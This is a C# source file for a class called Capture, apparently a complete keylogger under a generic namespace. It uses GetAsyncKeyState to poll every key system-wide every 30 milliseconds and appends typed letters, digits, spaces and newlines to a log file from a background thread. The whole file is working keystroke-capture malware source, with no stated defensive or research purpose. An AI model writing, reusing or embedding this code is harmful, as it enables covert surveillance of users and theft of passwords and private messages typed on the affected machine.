// bigdegen 2023
// Import necessary libraries

using System.Runtime.InteropServices;
using System.Windows.Forms;

// Create a class named Capture in the namespace MyApp.Util
namespace MyApp.Util;

// Define the Capture class
internal class Capture
{
    private string buffer;
    private bool isLogging;
    private readonly Dictionary<int, bool> keyStates;
    private readonly Thread loggingThread;

    // Declare private variables for logging and file I/O
    private readonly StreamWriter sw;

    // Constructor for the Capture class
    public Capture(string logFilePath)
    {
        // Initialize variables
        buffer = "";
        sw = new StreamWriter(logFilePath, true);
        sw.WriteLine("\n***\nCapturing, " + DateTime.Now);
        keyStates = new Dictionary<int, bool>();
        for (var i = 0; i < 255; i++) keyStates[i] = false;

        // Start the logging thread
        isLogging = true;
        loggingThread = new Thread(LogKeys);
        loggingThread.Start();
    }

// Import a function from user32.dll
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    // Method to continuously log pressed keys
    private void LogKeys()
    {
        while (isLogging)
        {
            // If buffer is full, write to file and clear buffer
            if (buffer.Length >= 8)
                lock (sw)
                {
                    sw.WriteAsync(buffer);
                    buffer = "";
                    sw.Flush();
                }

            // Sleep thread for 30 milliseconds
            Thread.Sleep(30);

            // Iterate through all possible keys
            for (var i = 0; i < 255; i++)
            {
                // Get the state of the current key
                int keyState = GetAsyncKeyState(i);

                // If the key is pressed
                if ((keyState & 0x8000) != 0)
                {
                    // If the key has not been pressed before
                    if (!keyStates[i])
                    {
                        // Get the string representation of the key
                        var keyString = ((Keys)i).ToString();

                        // If the key is a letter or space, add it to the buffer
                        if (keyString.Length == 1 && (char.IsLetterOrDigit(keyString[0])))
                            buffer += keyString;
                        // If the key is the Enter key, add a newline character to the buffer
                        else if (i == (int)Keys.Enter) buffer += "\n";
                        else if (i == (int)Keys.Space) buffer += " ";
                    }

                    // Mark the key as pressed
                    keyStates[i] = true;
                }
                else
                {
                    // Mark the key as not pressed
                    keyStates[i] = false;
                }
            }
        }
    }

    // Method to stop the logging thread and close the file
    public void StopLogging()
    {
        sw.Write(buffer);
        isLogging = false;
        loggingThread.Join();
        sw.Close();
    }
}